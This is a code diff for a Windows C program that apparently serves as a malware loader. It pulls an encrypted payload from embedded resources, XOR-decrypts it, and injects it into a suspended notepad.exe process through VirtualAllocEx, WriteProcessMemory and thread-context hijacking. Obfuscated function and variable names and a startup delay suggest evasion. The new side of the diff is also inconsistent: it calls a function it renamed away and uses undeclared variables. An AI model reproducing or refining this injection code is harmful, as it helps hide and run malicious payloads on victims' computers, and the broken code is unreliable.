@@ -1,3 +1,4 @@
+
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -5,39 +6,42 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void ooooloadrekusigma(const char* resourname, char** data, DWORD* size) {
+void loadresbabe(const char* renamer, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, resourname, RT_RCDATA);
+    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
     
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
     *data = (char*)LockResource(hResData);
 }
 
-void youareawsomeenc(char* dancode, DWORD dancodeLen, unsigned char* dkdan1e2y6, DWORD dank1e2y6Len) {
-    for (DWORD i = 0; i < dancodeLen; i++) {
-        dancode[i] ^= dkdan1e2y6[i % dank1e2y6Len];
+void Decxxxoor(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
+    for (DWORD da = 0; da < c1o2d3e4Len; da++) {
+        c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
     }
 }
 
 int main() {
-    Sleep(3000);
+    Sleep(2000);
 
+    
     char* dank1e6ENC;
     DWORD dank1e6ENCLen;
-    ooooloadrekusigma("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
+    ooooloadrekusigma("dhanushkey1", &key101k, &key101kLen);
 
     char* codfhu;
     DWORD codfhuLen;
-    ooooloadrekusigma("dhanushcode56", &codfhu, &codfhuLen);
+    ooooloadrekusigma("dhanushcode56", &code199k, &code199kLen);
 
-    //youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
+    // Decrypt the payload
+    Decxxxoor(code199k, code199kLen, (unsigned char*)key101k, key101kLen);
 
+    // Create a new process in a suspended state
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\systme32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
 
     
@@ -46,13 +50,16 @@ int main() {
 
     GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
 
-    youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
-    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
-    ctx.Rcx = (DWORD64)dankummm; 
+    // Write payload to target process
+    WriteProcessMemory(pi.hProcess, memlo, code199k, code199kLen, NULL);
+    // Update entry point
+    ctx.Rcx = (DWORD64)memlo; // Use Rcx for x64 processes
     SetThreadContext(pi.hThread, &ctx);
 
+    // Resume thread to execute payload
     ResumeThread(pi.hThread); 
 
     
